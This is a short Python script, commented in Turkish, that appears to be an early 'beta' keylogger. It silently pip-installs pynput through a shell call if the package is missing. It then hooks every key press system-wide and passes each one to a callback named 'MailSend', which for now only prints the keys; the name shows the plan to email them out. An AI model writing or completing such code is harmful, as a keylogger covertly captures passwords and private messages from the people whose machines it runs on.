import os
try:
    import pynput
except:
    os.system("pip install pynput")
import pynput.keyboard


def MailSend(harfler):
    print(harfler)
dinleme = pynput.keyboard.Listener(on_press=MailSend)

with dinleme:
    dinleme.join()

# Beta aşaması harflerin yalnızca bir arada tutulması gerçekleşti.
